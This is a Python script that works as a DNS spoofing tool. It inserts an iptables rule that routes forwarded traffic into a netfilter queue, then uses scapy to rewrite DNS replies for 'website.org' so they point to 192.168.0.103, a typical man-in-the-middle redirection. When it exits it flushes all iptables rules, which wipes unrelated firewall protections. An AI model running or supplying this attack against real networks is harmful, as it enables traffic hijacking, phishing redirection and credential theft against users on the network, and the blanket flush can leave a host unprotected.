from subprocess import *
import scapy.all as scapy
from netfilterqueue import *

def process_packets(packets):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packets = scapy.IP(packets.get_payload())
    # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
    if scapy_packets.haslayer(scapy.DNSRR):
        # get the DNS question name, the domain name
        query_name = scapy_packets[scapy.DNSQR].qname
        print(query_name)
        if ("website.org".encode()) in query_name:
            # craft new answer, overriding the original
            # setting the rdata for the IP we want to redirect (spoofed)
            answer = scapy.DNSRR(rrname = query_name, rdata = "192.168.0.103")
            scapy_packets[scapy.DNS].an = answer
            # set the answer count to 1
            scapy_packets[scapy.DNS].ancount = 1
            # delete checksums and length of packet, because we have modified the packet
            # new calculations are required ( scapy will do automatically )
            del scapy_packets[scapy.IP].len
            del scapy_packets[scapy.IP].chksum
            del scapy_packets[scapy.UDP].chksum
            del scapy_packets[scapy.UDP].len

            packets.set_payload(bytes(scapy_packets))
        # scapy_packets.show()
        print("DONE")
    packets.accept()
queue_num = input("ENTER THE QUEUE NUMBER > ")
call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num",queue_num])

print("call")
queue = NetfilterQueue()
queue.bind(int(queue_num),process_packets)
try:
    queue.run()
except:
    call(["iptables","--flush"])
